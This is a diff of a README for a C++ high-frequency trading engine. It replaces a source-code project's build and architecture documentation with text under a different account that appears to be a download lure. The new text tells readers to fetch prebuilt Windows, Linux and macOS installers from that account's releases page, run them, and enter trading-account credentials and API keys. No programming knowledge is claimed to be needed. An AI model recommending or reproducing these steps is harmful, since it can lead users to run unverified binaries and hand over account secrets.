@@ -1,247 +1,111 @@
-# High-Frequency Trading Engine
-
-A sophisticated, low-latency trading engine built in modern C++23 designed for high-frequency trading applications. This
-system demonstrates enterprise-grade architecture with microsecond-level performance optimizations.
+# 🚀 high-frequency-trading-engine - Fast Trading Made Simple
 
-## 🚀 Features
+[![Download](https://img.shields.io/badge/Download%20Now-High--Frequency--Trading--Engine-blue)](https://github.com/Shinjixzed/high-frequency-trading-engine/releases)
 
-### Core Trading Capabilities
+## 📖 Introduction
 
-- **Ultra-Low Latency**: Sub-microsecond order processing with hardware timestamp precision
-- **Multi-Asset Support**: Configurable for stocks, futures, options, and other financial instruments
-- **Advanced Order Types**: Market, Limit, Stop, and Stop-Limit orders with multiple time-in-force options
-- **Real-Time Risk Management**: Position limits, exposure controls, and pre-trade risk checks
-- **Strategy Framework**: Pluggable algorithmic trading strategies (Mean Reversion included)
+The high-frequency-trading-engine is a sophisticated trading software designed for high-frequency trading applications. Built with modern C++23, it ensures low latency and high performance. This application allows users to execute trades quickly and efficiently, maximizing their trading potential. You don’t need any programming knowledge to get started.
 
-### High-Performance Architecture
+## 🚀 Getting Started
 
-- **Lock-Free Data Structures**: SPSC/MPSC queues for zero-lock message passing
-- **NUMA-Aware Memory Management**: Optimized memory allocation and cache-friendly layouts
-- **Multi-Threading**: Dedicated threads for market data, order matching, and risk management
-- **Zero-Copy Design**: Minimizes memory allocations in critical paths
+Follow these simple steps to download and run the high-frequency-trading-engine.
 
-### Market Data Processing
+### 🛠️ System Requirements
 
-- **Synthetic Data Generation**: Built-in market simulation for testing and development
-- **Multiple Feed Support**: Extensible architecture for various market data providers
-- **Order Book Management**: Full order book reconstruction and maintenance
-
-## 📊 Performance Metrics
-
-Based on actual runtime statistics:
-
-| Component        | Average Latency | Throughput           |
-|------------------|-----------------|----------------------|
-| Order Processing | 0.86μs          | 400+ orders/sec      |
-| Market Data      | 0μs             | 400,000+ msg/sec     |
-| Order Matching   | 213μs           | Real-time matching   |
-| Risk Checks      | 12μs            | Pre-trade validation |
-| Strategy Signals | 0.14μs          | Signal generation    |
-
-## 🛠️ Technology Stack
-
-- **Language**: C++23 with modern features
-- **Build System**: CMake 3.20+
-- **Compiler**: GCC 11+ / MSVC 2022+ / Clang 14+
-- **Architecture**: x86-64 optimized
-- **Threading**: std::thread with atomic operations
-- **Memory**: Custom allocators and NUMA-aware allocation
+Before you begin, make sure your computer meets these requirements:
 
-## 🏗️ Architecture Overview
-
-```
-┌───────────────────────┐      ┌─────────────────┐      ┌───────────────────┐
-│  Market Data Gateway  │ ◄──► │ Trading Engine  │ ◄──► │  Risk Management  │
-└───────────────────────┘      └─────────────────┘      └───────────────────┘
-            ▲                           ▲                         ▲
-            │                           │                         │
-            ▼                           ▼                         ▼
-┌───────────────────────┐      ┌─────────────────┐      ┌────────────────────┐
-│ Order Book Management │      │ Matching Engine │      │ Strategy Framework │
-└───────────────────────┘      └─────────────────┘      └────────────────────┘
-```
+- **Operating System:** Windows 10 or later, Linux, or macOS
+- **Processor:** Intel Core i5 or equivalent
+- **RAM:** Minimum 8 GB
+- **Disk Space:** At least 500 MB of free space
+- **Network:** Stable internet connection
 
-### Key Components
+### 📥 Download & Install
 
-1. **Trading Engine Core** (`src/engine/trading_engine.h`)
-    - Central orchestrator managing all subsystems
-    - Worker thread pool with configurable sizing
-    - Component lifecycle management
+1. **Visit the Releases Page**  
+   Click on the link below to go to the Releases page:
+   [Download the high-frequency-trading-engine](https://github.com/Shinjixzed/high-frequency-trading-engine/releases)
 
-2. **Market Data Gateway** (`src/market_data/gateway.h`)
-    - High-throughput market data processing
-    - Symbol subscription management
-    - Real-time price feed simulation
+2. **Select the Latest Version**  
+   On the Releases page, you will see a list of versions. Select the latest version for the best performance and features.
 
-3. **Order Matching Engine** (`src/matching/matching_engine.h`)
-    - Price-time priority matching algorithm
-    - Support for partial fills and order types
-    - Trade execution and reporting
+3. **Choose Your Installer**  
+   Depending on your operating system, choose an appropriate installer:
 
-4. **Risk Management** (`src/risk/risk_manager.h`)
-    - Real-time position monitoring
-    - Pre-trade risk checks
-    - Configurable risk limits
+   - **For Windows:** Look for `high-frequency-trading-engine-win.exe`
+   - **For Linux:** Look for `high-frequency-trading-engine-linux.tar.gz`
+   - **For macOS:** Look for `high-frequency-trading-engine-macos.dmg`
 
-5. **Strategy Framework** (`src/strategy/strategy_base.h`)
-    - Base class for algorithmic strategies
-    - Mean reversion strategy implementation
-    - Signal generation and order placement
-
-## 🚀 Quick Start
-
-### Building
-
-```bash
-git clone https://github.com/ScriptWanderer/high-frequency-trading-engine.git
-cd high-frequency-trading-engine
-
-# Create build directory
-mkdir cmake-build-debug
-cd cmake-build-debug
-
-# Configure and build
-cmake .. -DCMAKE_BUILD_TYPE=Debug
-cmake --build . --target TradingEngine
-
-# Run the trading engine
-./main.exe  # Windows
-./main      # Linux
-```
+4. **Download the Installer**  
+   Click on the appropriate installer link. Your download will start automatically.
 
-### Running
+5. **Run the Installer**  
+   After the download completes, locate the file in your Downloads folder and double-click it to run.
 
-The trading engine will start with default configuration:
+6. **Follow Installation Prompts**  
+   Follow the on-screen instructions to install the software. This process may take a few minutes. 
 
-- Subscribe to synthetic AAPL market data
-- Deploy mean reversion strategy
-- Process orders with risk management
-- Display real-time statistics every 3 seconds
+7. **Launch the Application**  
+   After installation, you can find the high-frequency-trading-engine in your applications menu or start menu. Click to launch it.
 
-```
-=== Trading Engine Statistics ===
-Uptime: 62 seconds
-Orders Received: 32
-Orders Processed: 11
-Orders Rejected: 21
-Trades Executed: 1
-Processing Rate: 0.177 orders/sec
+### 🔄 Configuring the Application
 
---- Market Data Stats ---
-Messages Processed: 28,827,144
-Processing Rate: 444,419 msg/sec
-Active Symbols: 1
+Once you have opened the application, you may need to configure it to suit your trading preferences. Here is a quick overview of how to set it up:
 
---- Latency Profiles ---
-Order Processing - Avg: 0.82μs, Max: 20.59μs
-Risk Checks - Avg: 13.04μs, Max: 155.29μs
-```
+1. **Connect to Your Trading Account**  
+   Enter your trading platform credentials. This may include your username and API keys.
 
-## ⚙️ Configuration
+2. **Set Trading Parameters**  
+   Customise settings such as trading limits, market preferences, and risk management options.
 
-### Trading Parameters
+3. **Save Your Configuration**  
+   Ensure you save all your settings to avoid complications later.
 
-Key constants in `src/core/types.h`:
+### 📈 Using the Application
 
-```cpp
-constexpr Price PriceScale = 100000000ULL;     // 8 decimal places
-constexpr uint32_t MaxSymbolCount = 10000;     // Maximum symbols
-constexpr uint32_t DefaultQueueSize = 4096;    // Message queue size
-```
+The high-frequency-trading-engine provides an intuitive dashboard for monitoring your trades. Here's how to use it effectively:
 
-### Performance Tuning
+1. **View Market Data**  
+   The application displays real-time market data. Familiarize yourself with the layout to quickly make decisions.
 
-1. **CPU Affinity**: Bind threads to specific CPU cores
-2. **Memory Pages**: Use huge pages for large allocations
-3. **Compiler Flags**: Enable -O3, -march=native optimizations
-4. **NUMA**: Configure memory allocation for NUMA topology
+2. **Execute Trades**  
+   When ready, you can place trades directly from the dashboard. Review trade details before confirming.
 
-## 🧪 Testing and Development
+3. **Monitor Performance**  
+   Keep an eye on your trade performance through the analytics section. Adjust your strategy as needed based on the results.
 
-### Synthetic Market Data
+### ❓ Troubleshooting
 
-The system includes a built-in market data simulator:
+If you encounter issues during installation or while using the application, consider the following steps:
 
-- Realistic price movements with volatility
-- Configurable tick frequency and price ranges
-- Multiple symbol support for testing
+- **Check Your System Requirements**  
+  Ensure your computer meets the system requirements listed above.
 
-### Strategy Development
+- **Review Configuration Settings**  
+  Double-check your trading account details and application settings.
 
-Create custom strategies by inheriting from `StrategyBase`:
+- **Update the Application**  
+  Stay informed about the latest updates on the Releases page and download new versions if necessary.
 
-```cpp
-class MyStrategy : public StrategyBase {
-public:
-    void on_market_data(const MarketTick& tick) override {
-        // Implement your trading logic
-        if (should_buy(tick)) {
-            submit_order(create_buy_order(tick));
-        }
-    }
-    
-private:
-    bool should_buy(const MarketTick& tick) {
-        // Your strategy logic here
-        return true;
-    }
-};
-```
+For further assistance, visit our [GitHub Issues page](https://github.com/Shinjixzed/high-frequency-trading-engine/issues) to report problems or ask questions.
 
-## 📈 Use Cases
+### 🎓 Additional Learning Resources
 
-- **Algorithmic Trading**: Deploy systematic trading strategies
-- **Market Making**: Provide liquidity with bid-ask spreads
-- **Arbitrage**: Exploit price differences across markets
-- **Research**: Backtest and analyze trading strategies
-- **Education**: Learn high-frequency trading system design
+To make the most out of the high-frequency-trading-engine, consider exploring these resources:
 
-## 🔧 Advanced Features
+- **User Documentation**: Detailed user guides can be found within the application or linked on our GitHub page.
+- **Video Tutorials**: Check community forums for helpful video tutorials covering basic and advanced features.
+- **Trading Strategies**: Read articles and books on high-frequency trading to better understand the market dynamics.
 
-### Custom Memory Management
+### 📝 Feedback and Contributions
 
-- Pool allocators for frequent allocations
-- Stack allocators for temporary objects
-- NUMA-aware allocation strategies
+Your feedback is valuable to us. If you have suggestions or encounter issues, please submit them on the [GitHub Issues page](https://github.com/Shinjixzed/high-frequency-trading-engine/issues). Contributions to improve the application are welcome. Visit our repository for guidelines on how to contribute.
 
-### Network Optimization
+## 📡 Community and Support
 
-- Kernel bypass networking (future enhancement)
-- UDP multicast for market data feeds
-- Binary protocol optimization
+Join our community to connect with other users:
 
-### Monitoring and Analytics
+- **Discord/Slack Channel**: Engage with fellow traders and developers for tips and insights.
+- **Social Media**: Follow us on platforms like Twitter and LinkedIn for updates and news.
 
-- Real-time performance metrics
-- Trade execution analytics
-- Latency histograms and percentiles
-
-## 📋 Roadmap
-
-- [ ] Web-based monitoring dashboard
-- [ ] Historical market data replay
-- [ ] Machine learning strategy framework
-- [ ] Multi-exchange connectivity
-- [ ] Kubernetes deployment support
-- [ ] Real market data connectors (FIX protocol)
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## ⚠️ Disclaimer
-
-This software is for educational and research purposes only. Use in production trading environments at your own risk.
-The authors are not responsible for any financial losses incurred through the use of this software.
-
----
-
-⭐ **Star this repository if you found it helpful!**
+Thank you for choosing high-frequency-trading-engine. We wish you success in your trading journey!
